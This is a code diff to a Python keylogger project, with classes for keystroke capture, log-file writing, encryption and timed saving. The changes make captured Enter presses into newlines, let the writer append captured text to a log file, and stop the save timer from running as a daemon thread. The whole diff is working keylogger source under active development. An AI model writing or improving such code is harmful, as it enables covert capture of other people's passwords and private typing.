@@ -20,6 +20,10 @@ class KeyloggerService:
             print(self.logs)
         if key == keyboard.Key.space:
             key = " "
+        if key == keyboard.Key.enter:
+            key = "\n"
+
+
         # if keyboard.Key in self.exception:
         #     key = f" {key} "
         self.logs.append(key)
@@ -60,8 +64,13 @@ class FileWriter(Writer):
 
     def writer(self,data):
         with open(self.path, "a") as logfile:
-            for i in data:
-                logfile.write(str(i))
+            if isinstance(data, list):
+                for i in data:
+                    logfile.write(str(i))
+            else:
+                logfile.write("\n")
+                logfile.write(data)
+                logfile.write("\n")
 
 class Encryptor:
     @staticmethod
@@ -100,8 +109,11 @@ class KeyloggerManager:
         self.start_time = KeyloggerManager.get_time()
         self.keylogger_service.start_listener()
         self.timer = Timer(interval=10,function=self.save_data)
-        self.timer.daemon = True
+        # self.timer.daemon = True
         self.timer.start()
+
+
+
 
 
 # s = KeyloggerService()
